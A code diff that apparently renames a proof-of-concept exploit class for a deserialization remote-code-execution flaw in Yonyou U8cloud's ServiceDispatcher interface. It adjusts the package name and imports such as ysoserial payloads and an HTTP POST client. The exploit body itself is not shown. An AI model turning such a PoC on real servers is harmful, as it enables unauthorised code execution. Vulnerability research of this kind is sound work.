@@ -1,9 +1,8 @@
-package cve;
+package cve.u8cloud;
 
-import com.pacemrc.vuldebug.common.utils.HttpRequest;
+import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
 import nc.bs.framework.comn.NetObjectOutputStream;
 import org.apache.http.client.methods.HttpPost;
-import org.apache.http.entity.ContentType;
 import ysoserial.payloads.ObjectPayload;
 
 import java.io.ByteArrayOutputStream;
@@ -12,7 +11,7 @@ import java.io.ByteArrayOutputStream;
  * U8cloud所有版本ServiceDispatcher接口存在反序列化漏洞
  * https://security.yonyou.com/#/patchInfo?foreignKey=7bd5b43e2c984a618b2b1d3f288110ae
  */
-public class rce1 {
+public class ServiceDispatcherServlet_deserialize {
 
     public static void main(String[] args) throws Exception {
 
